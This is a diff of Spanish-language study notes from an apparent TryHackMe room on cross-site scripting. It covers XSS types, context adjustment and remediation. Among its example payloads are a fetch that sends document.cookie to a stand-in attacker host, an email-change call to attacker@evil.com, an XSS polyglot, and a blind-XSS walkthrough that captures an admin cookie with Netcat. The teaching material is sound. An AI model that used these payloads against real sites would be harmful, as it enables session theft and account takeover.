@@ -239,41 +239,46 @@ El atacante ahora puede solicitar el restablecimiento de contraseña hacia su pr
 <br>
 
 <h2>
-  <img src="https://cdn-images.tryhackme.com/room-icons/62a7685ca6e7ce005d3f3afe-1775466711834" width="60px" align="absmiddle">
-  <span> Introducción a la Falsificación de Solicitudes en Sitios Cruzados (CSRF)</span>
+  <img src="https://cdn-images.tryhackme.com/room-icons/691e303c8bb7e99b93a58132-1775464376816" width="60px" align="absmiddle">
+  <span> Introducción a Scripts en Sitios Cruzados (XSS)</span>
 </h2>
-## 3. Introducción a Scripts en Sitios Cruzados (XSS)
 
 ### 3.1 Introducción y Terminología Importante
 Las aplicaciones web modernas procesan gran cantidad de interacciones de usuario y el **Scripting en Sitios Cruzados (Cross-Site Scripting - XSS)** sigue siendo una de las vulnerabilidades más frecuentes y con mayor impacto. Ocurre cuando una aplicación web acepta entradas del usuario y las incluye en las páginas enviadas al navegador sin haberlas filtrado o codificado adecuadamente. Esto permite a un atacante inyectar código ejecutable JavaScript en el navegador de otros usuarios.
 
 #### Conceptos y Terminología Clave:
-**Modelo de Objetos del Documento (DOM - Document Object Model):** Es la representación en memoria y estructurada en árbol (etiquetas, atributos, texto) que hace el navegador de una página web. JavaScript lee y modifica dinámicamente este árbol en tiempo real para actualizar la interfaz.
-**Parámetros de URL (Query Strings):** Datos pasados a través de la barra de direcciones después del símbolo `?` (ejemplo: `https://site.com/search?q=producto`). Al ser totalmente editables por el usuario, deben tratarse siempre como entradas no confiables.
-**JavaScript:** Lenguaje de programación que se ejecuta en el cliente (navegador). Los payloads de XSS son fragmentos de JavaScript que se ejecutan bajo el contexto de seguridad y sesión del sitio web vulnerable.
-**Cookies y la bandera `HttpOnly`:** Las cookies almacenan datos de sesión. Si una cookie de sesión no tiene la bandera `HttpOnly`, el código JavaScript inyectado puede leerla mediante `document.cookie` y exfiltrarla al atacante. La bandera `HttpOnly` bloquea la lectura de cookies desde JavaScript.
-**Escapado / Codificación de Salida (*Output Encoding*) vs. Filtrado:**
+* **Modelo de Objetos del Documento (DOM - Document Object Model):** Es la representación en memoria y estructurada en árbol (etiquetas, atributos, texto) que hace el navegador de una página web. JavaScript lee y modifica dinámicamente este árbol en tiempo real para actualizar la interfaz.
+* **Parámetros de URL (Query Strings):** Datos pasados a través de la barra de direcciones después del símbolo `?` (ejemplo: `https://site.com/search?q=producto`). Al ser totalmente editables por el usuario, deben tratarse siempre como entradas no confiables.
+* **JavaScript:** Lenguaje de programación que se ejecuta en el cliente (navegador). Los payloads de XSS son fragmentos de JavaScript que se ejecutan bajo el contexto de seguridad y sesión del sitio web vulnerable.
+* **Cookies y la bandera `HttpOnly`:** Las cookies almacenan datos de sesión. Si una cookie de sesión no tiene la bandera `HttpOnly`, el código JavaScript inyectado puede leerla mediante `document.cookie` y exfiltrarla al atacante. La bandera `HttpOnly` bloquea la lectura de cookies desde JavaScript.
+* **Escapado / Codificación de Salida (*Output Encoding*) vs. Filtrado:**
 *Escapado (Codificación):* Transforma caracteres especiales en entidades HTML seguras (por ejemplo, convierte `<` en `&lt;` y `>` en `&gt;`), logrando que el navegador renderice la entrada estrictamente como texto plano sin ejecutarla como código.
 *Filtrado (Validación):* Comprueba que la entrada cumpla con ciertas reglas de formato (letras, longitud), pero no impide que los datos se interpreten como código si no se codifican al imprimirlos en el HTML.
+
+<br>
 
 ### 3.2 Payloads de XSS y sus Intenciones
 Un **payload de XSS** es la cadena de código JavaScript inyectada por el atacante para que sea ejecutada en el navegador de la víctima. 
 
 Un payload consta de dos partes principales:
-**Intención:** Lo que el atacante desea lograr (PoC, robar sesión, registrar teclas, alterar la lógica).
-**Arreglo / Ajuste (*Context Adjustment*):** Las modificaciones en la sintaxis requeridas para cerrar etiquetas HTML, atributos o comillas previas y permitir la ejecución del script según la estructura del código fuente de la página.
+* **Intención:** Lo que el atacante desea lograr (PoC, robar sesión, registrar teclas, alterar la lógica).
+* **Arreglo / Ajuste (*Context Adjustment*):** Las modificaciones en la sintaxis requeridas para cerrar etiquetas HTML, atributos o comillas previas y permitir la ejecución del script según la estructura del código fuente de la página.
+
+<br>
 
 #### Tipos de Intenciones según el Objetivo del Atacante:
-**Prueba de Concepto (PoC):** El payload más simple para demostrar la presencia de la vulnerabilidad sin causar daño, comúnmente `<script>alert('XSS')</script>`.
-**Robo de Sesión (Session Hijacking):** Extrae la cookie de autenticación del usuario y la envía al servidor del atacante:
+* **Prueba de Concepto (PoC):** El payload más simple para demostrar la presencia de la vulnerabilidad sin causar daño, comúnmente `<script>alert('XSS')</script>`.
+* **Robo de Sesión (Session Hijacking):** Extrae la cookie de autenticación del usuario y la envía al servidor del atacante:
   ```javascript
   fetch('http://servidor-atacante.com/log?cookie=' + btoa(document.cookie));
   ```
-**Registrador de Teclas (*Keylogger*):** Captura todas las pulsaciones de teclado que efectúa el usuario en la página vulnerable (usuarios, contraseñas, tarjetas) y las exfiltra en tiempo real a un servidor externo.
-**Ataques a la Lógica de Negocio:** Invoca funciones JavaScript internas de la aplicación. Si existe una función como `user.changeEmail()`, el payload inyectado puede invocarla automáticamente para cambiar la clave o el correo del usuario objetivo:
+* **Registrador de Teclas (*Keylogger*):** Captura todas las pulsaciones de teclado que efectúa el usuario en la página vulnerable (usuarios, contraseñas, tarjetas) y las exfiltra en tiempo real a un servidor externo.
+* **Ataques a la Lógica de Negocio:** Invoca funciones JavaScript internas de la aplicación. Si existe una función como `user.changeEmail()`, el payload inyectado puede invocarla automáticamente para cambiar la clave o el correo del usuario objetivo:
   ```javascript
   user.changeEmail('attacker@evil.com');
   ```
+
+<br>
 
 ### 3.3 XSS Reflejado (Reflected XSS - Non-Persistent)
 Ocurre cuando la entrada suministrada por el usuario (parámetros de búsqueda en la URL, campos de formulario o encabezados HTTP) se incluye inmediatamente en la respuesta HTTP enviada por el servidor sin ser filtrada ni codificada.
@@ -297,6 +302,8 @@ return render_template("index.html", query=query, safe_query=Markup(query))
 ```
 Al desactivar el escapado automático mediante el filtro `|safe` (`{{ query|safe }}`), cualquier código HTML o JS inyectado por el usuario se renderiza como código ejecutable.
 
+<br>
+
 ### 3.4 XSS Almacenado (Stored XSS - Persistent)
 El **XSS Almacenado** es la variante más peligrosa de XSS. Se produce cuando la entrada maliciosa enviada por el atacante se guarda permanentemente en el almacenamiento del servidor (base de datos, archivos de registro, comentarios, perfiles de usuario, sistemas de tickets) y posteriormente se sirve a otros usuarios que visitan la página.
 
@@ -310,6 +317,8 @@ Cada vez que cualquier usuario (o un administrador) navega a `/guestbook`, el se
 #### Causa Raíz:
 El backend guarda el texto plano en la base de datos y la plantilla Jinja2 lo imprime utilizando la etiqueta `{{ c.comment|safe }}`, omitiendo el escapado de caracteres HTML.
 
+<br>
+
 ### 3.5 XSS Basado en DOM (DOM-Based XSS - Client Side)
 El **XSS basado en DOM** se diferencia de las variantes reflejada y almacenada en que el ataque se ejecuta completamente en el lado del cliente (en el navegador). La entrada del atacante nunca llega al servidor ni es procesada por código backend.
 
@@ -322,6 +331,8 @@ La página contiene un campo de texto para previsualizar contenido en vivo. El s
 document.getElementById('previewArea').innerHTML = userInput;
 ```
 Al ingresar `<img src="x" onerror="alert('DOM XSS')">`, el navegador interpreta el contenido asignado a `innerHTML`, fuerza el fallo al cargar la imagen inexistente `x` y ejecuta el manejador de eventos `onerror`, activando la alerta JavaScript sin que la petición haya pasado por el servidor backend.
+
+<br>
 
 ### 3.6 XSS Ciego (Blind XSS)
 El **XSS Ciego** es una variante especial de XSS almacenado donde el payload inyectado se guarda en el servidor pero se muestra en un área administrativa o panel interno al que el atacante no tiene acceso visual (por ejemplo, formularios de contacto, solicitudes de empleo, comentarios de soporte o logs de auditoría).
@@ -341,6 +352,8 @@ Al no tener visibilidad directa de la ejecución, el atacante debe incluir en su
 **Recepción:** En la consola de Netcat se recibe la petición saliente:
    `GET /?cookie=c2Vzc2lvbj1ZX3JvYm90X2FkbWluX2tleQ== HTTP/1.1`
    Al decodificar la cadena Base64 con `echo 'c2Vzc2lvbj1...' | base64 -d`, se obtiene la cookie de sesión del administrador, permitiendo al atacante suplantar su identidad.
+
+<br>
 
 ### 3.7 Perfeccionamiento del Payload y Adaptación al Contexto
 Para lograr que un payload de XSS se ejecute correctamente, es indispensable analizar la estructura del código HTML donde la entrada es reflejada y adaptar la sintaxis de escape.
@@ -375,6 +388,8 @@ Un **políglota XSS** es una cadena de código construida estratégicamente para
 ```javascript
 jaVasCript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/`/onload=alert('THM')//'>
 ```
+
+<br>
 
 ### 3.8 Remediación y Prevención de XSS
 **Codificación de Salida Sensible al Contexto (*Context-Aware Output Encoding*):** Es la solución primaria. Consiste en codificar todos los caracteres especiales antes de imprimirlos en pantalla según la ubicación exacta donde se inserten:
